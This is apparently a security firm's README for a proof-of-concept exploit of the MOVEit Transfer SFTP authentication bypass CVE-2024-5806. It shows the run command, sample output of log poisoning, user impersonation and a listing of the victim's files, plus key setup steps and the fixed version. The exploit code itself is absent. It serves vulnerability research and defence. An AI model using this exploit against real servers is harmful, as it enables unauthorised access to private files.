# CVE-2024-5806

Exploit for Progress MOVEit Transfer CVE-2024-5806. See our blog post at [TBD].

# PoC in Action

See `--help` for, well, help. A typical run should look like this:

```
> python CVE-2024-5806.py --target-ip 192.168.1.1 --target-user user2 --ppk id.ppk --pem id
                         __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                                  \/          \/     \/

        CVE-2024-5806.py
        (*) Progress MoveIT Transfer SFTP Authentication Bypass (CVE-2024-5806)
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
        Note: We (watchTowr) aren't the original discoverers of the bug, we just reproduced it and wrote the exploit
              in order to enable proactive protection of client attack surfaces.
              We will update with proper credit when available.
        CVEs: [CVE-2024-5806]

(*) Poisoning log files multiple times to be sure...
..........OK
(*) Waiting 60 seconds for logs to be flushed to disk
(*) Attempting to authenticate..
(*) Trying to impersonate user2 using the server-side file path 'C:\MOVEitTransfer\Logs\DMZ_WEB.log'
(+) Authentication succeeded.
(+) Listing files in home directory of user user2:

-rw-rw-rw- 1 0 0 1.4M Jun 11 11:39 stocks.xlsx
-rw-rw-rw- 1 0 0 2.4M Jun 13 13:32 customer_list.xlsx
-rw-rw-rw- 1 0 0 2.3M Jun 15 12:16 payroll_Jun.csv
-rw-rw-rw- 1 0 0 1.2M Jan 21 10:03 my_signature.png
-rw-rw-rw- 1 0 0  304 Jun 17 17:29 passwords.txt
```


# Setup
To run the exploit, you'll need a keypair in both PEM and PPK format. On Windows, you can use `puttygen` to generate these files. On Linux, you can use `openssh` and `putty-tools` package. Just hit enter when prompted for a key.

```bash
$ sudo apt-get install openssh-client putty-tools
$ puttygen -t rsa -b 2048 -o putty_key.ppk
Enter passphrase to save key:
Re-enter passphrase to verify:
$ puttygen putty_key.ppk -O private-openssh -o id_rsa
```

# Affected Versions

This vulnerability is fixed in Progress MOVEit version `2024.0.2`.

# Exploit authors

This exploit was written by [Aliz (@AlizTheHax0r)](https://x.com/AlizTheHax0r) and [Sina Kheirkhah (@SinSinology)](https://x.com/SinSinology) of [watchTowr (@watchtowrcyber)](https://twitter.com/watchtowrcyber) 

# Follow [watchTowr](https://watchTowr.com) Labs
For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/
- https://twitter.com/watchtowrcyber
- [blog link TBD]
